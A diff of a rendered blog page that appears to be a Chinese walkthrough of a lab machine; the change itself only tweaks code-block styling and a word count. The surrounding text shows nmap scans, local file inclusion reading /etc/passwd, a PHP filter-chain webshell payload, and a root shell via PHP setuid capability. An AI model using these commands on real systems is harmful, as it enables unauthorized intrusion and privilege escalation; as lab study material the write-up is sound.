@@ -264,14 +264,14 @@ function checkNightMode() {
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_5.png" alt="HMM_quick2_image_5|750" /><figcaption>HMM_quick2_image_5|750</figcaption></figure>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script<span style="color:#f92672">=</span>vuln -oA  portscan/vuln
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script<span style="color:#f92672">=</span>vuln -oA  portscan/vuln
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_6.png" alt="HMM_quick2_image_6|700" /><figcaption>HMM_quick2_image_6|700</figcaption></figure>
@@ -283,7 +283,7 @@ function checkNightMode() {
 尝试 local file include LFI
 获取到了/etc/passwd
 在 home 目录下有文件夹的有这两个用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash
 </span></span><span style="display:flex;"><span>nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash
 </span></span></code></pre></div><p>获得了 user. txt</p>
 <p>
@@ -317,7 +317,7 @@ function checkNightMode() {
 2024-02-14-20:40:27
 这个工具是看大佬的 wp 视频知道了, 反正以后遇到使用 php 伪协议的, 就可以用这个工具了</p>
 <p>使用工具生成一个复杂的伪协议利用代码，获得一个 webshell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python php_filter_chain_generator.py --chain <span style="color:#e6db74">&#34;&lt;?php echo system(</span>$_GET<span style="color:#e6db74">[&#39;cmd&#39;]) ?&gt;&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python php_filter_chain_generator.py --chain <span style="color:#e6db74">&#34;&lt;?php echo system(</span>$_GET<span style="color:#e6db74">[&#39;cmd&#39;]) ?&gt;&#34;</span>
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_11.png" alt="HMM_quick2_image_11|700" /><figcaption>HMM_quick2_image_11|700</figcaption></figure>
@@ -357,7 +357,7 @@ function checkNightMode() {
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>a<span style="color:#f92672">=</span>php%20/tmp/shell.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>a<span style="color:#f92672">=</span>php%20/tmp/shell.txt
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_17.png" alt="HMM_quick2_image_17" /><figcaption>HMM_quick2_image_17</figcaption></figure>
@@ -366,14 +366,14 @@ function checkNightMode() {
 </p>
 <h2 id="利用-capabilities-文件提权">利用 capabilities 文件提权</h2>
 <p>第一步先上脚本, linpeas. sh, 然后发现了这个特殊权限的文件 php</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/php8.1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/php8.1
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_18.png" alt="HMM_quick2_image_18" /><figcaption>HMM_quick2_image_18</figcaption></figure>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/php8.1 -r <span style="color:#e6db74">&#34;posix_setuid(0);system(&#39;/bin/sh&#39;);&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/php8.1 -r <span style="color:#e6db74">&#34;posix_setuid(0);system(&#39;/bin/sh&#39;);&#34;</span>
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_19.png" alt="HMM_quick2_image_19" /><figcaption>HMM_quick2_image_19</figcaption></figure>
@@ -557,7 +557,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 129194 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 129185 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
